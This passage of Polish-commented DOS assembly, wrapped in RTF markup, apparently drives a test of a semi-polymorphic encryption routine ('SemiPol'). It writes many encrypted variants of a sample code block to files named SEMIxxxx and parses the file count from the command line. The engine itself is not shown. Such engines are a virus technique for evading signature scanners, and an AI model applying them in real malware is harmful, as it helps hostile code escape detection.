\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   dx,AktualnaNazwaPliku       ; sprobuj otworzyc (tworzony) plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,3D02h                    ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jnc   WezUchwyt                   ; CF=0 plik juz istnial, nadpisz go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,20h                      ; atrybut pliku tworzonego : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   dx,AktualnaNazwaPliku       ; podaj nazwe tworzonego pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ah,5Bh                      ; funkcja DOS - tworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WezUchwyt:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   UchwytPliku,ax              ; zapamietaj uchwyt pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,StartKoduPrzykladowego   ; DS:SI - skad brac kod do szyfrowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   di,BuforDocelowy            ; ES:DI - dokad zapisywac zaszyfrowany kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,RozmiarPrzykladowegoKodu ;    CX - rozmiar szyfrowanego kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  SemiPol}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; CX:=Ile danych do zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   dx,BuforDocelowy            ; skad zapisac dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   bx,UchwytPliku              ; numer uchwytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ah,40h                      ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ah,3Eh                      ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  ZwiekszNumerPliku           ; SEMI(xxxx) -> SEMI(xxxx+1)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   cx                          ; przywroc ze stosu : ile plikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       loop  GenJedenPlik                ; generuj CX plikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   di si dx cx bx ax es ds     ; przywroc ze stosu zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GenerowaniePlikow endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwiekszNumerPliku proc near             ; zmienia SEMI(xxxx) na SEMI(xxxx+1)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; operuje na lancuchu 'SEMIxxxx'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  cx si                       ; zachowaj na stosie zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,4                        ; CX = ile max. obiegow petli = 4 cyfry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwiekszNumerPlikuPetla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   si,cx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       dec   si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       inc   byte ptr [AktNumPliku+si]   ; zwieksz cyfre od konca w SEMIxxxx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   byte ptr [AktNumPliku+si],'9'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; czy numer > 9 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jbe   ZwiekszNumerPlikuPowrot     ; nie wiekszy = powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; wiekszy = uwzglednij przeniesienie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   byte ptr [AktNumPliku+si],'0'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; cyfra : 9->0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       loop  ZwiekszNumerPlikuPetla      ; ewentualnie powtarzaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwiekszNumerPlikuPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   si cx                       ; przywroc ze stosu zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwiekszNumerPliku endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WezParametry proc near                  ; pobiera parametry z PSP:80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  ds                          ; zachowaj DS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   di,DomyslnieIlePlikow       ; DI=ile plikow wygenerowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ds,PSP_Segment              ; DS:=PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   si,80h                      ; DS:SI=PSP:80}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lodsw                             ; DS:SI=PSP:82, AX:=licznik znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       or    al,al                       ; czy sa jakies znaki w linii polecen ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jz    WezParametryPowrot          ; nie = wyjdz z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajCyfry:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lodsb                             ; wez znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,SPACE                    ; \\pomin spacje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       je    SzukajCyfry                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,TAB                      ; \\pomin tabulator}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       je    SzukajCyfry                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   bx,si                       ; zachowaj pozycje w lancuchu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajCR:                               ; szukaj konca ciagu znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lodsb                             ; wez znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,CR                       ; czy koniec lancucha ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       je    LancuchNaLiczbe             ; tak = konwersja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,SPACE                    ; czy spacja ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       je    LancuchNaLiczbe             ; tak = konwersja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,TAB                      ; czy tabulator ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       je    LancuchNaLiczbe             ; tak = konwersja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,'0'                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jb    WezParametryPowrot          ;  \\   czy znak w zakresie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;   -  '0'..'9'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   al,'9'                      ;  /   jezeli nie, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ja    WezParametryPowrot          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jmp   short SzukajCR              ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LancuchNaLiczbe:                        ; konwersja lancucha na liczbe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,si                       ; wez koniec lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   cx,bx                       ; odejmij poczatek lancucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jcxz  WezParametryPowrot          ; skocz, gdy nie ma czego konwertowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cmp   cx,4                        ; czy liczba > 9999 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ja    WezParametryPowrot          ; skocz, jesli tak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   bx,1                        ; BX zawiera kolejne potegi 10}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       xor   di,di                       ; DI zawiera aktualna sume}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   LancuchNaLiczbeLoop:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; znaki czytamy od konca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       dec   si                          ; \\ SI:=SI-2}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       dec   si                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lodsb                             ; pobierz znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   al,'0'                      ; konwertuj na liczbe z zakresu 0..9}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ah,0                        ; AX=AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mul   bx                          ; mnoz przez kolejna potege 10}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       add   di,ax                       ; dodaj do sumy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,10                       ; zwieksz potege 10}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mul   bx                          ; pomnoz 10*BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       xchg  ax,bx                       ; BX:=10 do kolejnej potegi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; 1,10,100,1000}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       loop  LancuchNaLiczbeLoop         ; konwertuj kolene cyfry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WezParametryPowrot:                     ; DI zawiera liczbe plikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   ds                          ; przywroc DS ze stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov LiczbaPlikow,di               ; przepisz do zmiennej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WezParametry endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn proc near                        ; procedura wyswietla tekst ASCIIZ}{\f2\fs24\lang1045{\*\listtag0}\par}
